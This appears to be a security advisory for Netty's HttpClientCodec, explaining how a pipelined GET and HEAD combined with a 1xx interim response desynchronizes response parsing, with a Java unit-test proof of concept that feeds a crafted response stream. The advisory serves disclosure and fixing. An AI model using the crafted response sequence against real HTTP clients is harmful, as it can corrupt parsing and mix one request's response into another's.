summary: "Netty has HttpClientCodec response desynchronization\n### Summary\n If HttpClientCodec\
  \ is configured, there are use cases when a response body from one request, can be parsed\
  \ as another's.\n\n### Details\nHttpClientCodec pairs each inbound response with an outbound\
  \ request by `queue.poll()` once per response, including for `1xx`. If the client pipelines\
  \ GET then HEAD and the server sends 103, then 200 with GET body, then 200 for HEAD, the queue\
  \ pairs HEAD with the first 200. The HEAD rule then skips reading that message’s body, so\
  \ the GET entity bytes stay on the stream and the following 200 is parsed from the wrong offset.\n\
  \nPrerequisites \n- HTTP/1.1 pipelining\n- HEAD in the pipeline\n- The server sends 1xx\n\n\
  ### PoC\n\n```java\n    @Test\n    public void test() {\n        EmbeddedChannel channel =\
  \ new EmbeddedChannel(new HttpClientCodec());\n\n        assertTrue(channel.writeOutbound(new\
  \ DefaultFullHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.GET, \"/1\")));\n        ByteBuf\
  \ request = channel.readOutbound();\n        request.release();\n        assertNull(channel.readOutbound());\n\
  \n        assertTrue(channel.writeOutbound(new DefaultFullHttpRequest(HttpVersion.HTTP_1_1,\
  \ HttpMethod.HEAD, \"/2\")));\n        request = channel.readOutbound();\n        request.release();\n\
  \        assertNull(channel.readOutbound());\n\n        String responseStr = \"HTTP/1.1 103\
  \ Early Hints\\r\\n\\r\\n\" +\n                \"HTTP/1.1 200 OK\\r\\nContent-Length: 5\\\
  r\\n\\r\\nhello\" +\n                \"HTTP/1.1 200 OK\\r\\n\\r\\n\";\n        assertTrue(channel.writeInbound(Unpooled.copiedBuffer(responseStr,\
  \ CharsetUtil.US_ASCII)));\n\n        // Response 1\n        HttpResponse response = channel.readInbound();\n\
  \        assertEquals(HttpResponseStatus.EARLY_HINTS, response.status());\n        LastHttpContent\
  \ last = channel.readInbound();\n        assertEquals(0, last.content().readableBytes());\n\
  \        last.release();\n\n        // Response 2\n        response = channel.readInbound();\n\
  \        assertEquals(HttpResponseStatus.OK, response.status());\n        last = channel.readInbound();\n\
  \        assertEquals(0, last.content().readableBytes());\n        last.release();\n\n   \
  \     // Response 3\n        FullHttpResponse response1 = channel.readInbound();\n       \
  \ assertTrue(response1.decoderResult().isFailure());\n        assertEquals(0, response1.content().readableBytes());\n\
  \        response1.release();\n\n        assertFalse(channel.finish());\n    }\n```\n\n###\
  \ Impact\nIntegrity/availability of HTTP parsing on that connection, unsafe reuse of the socket."
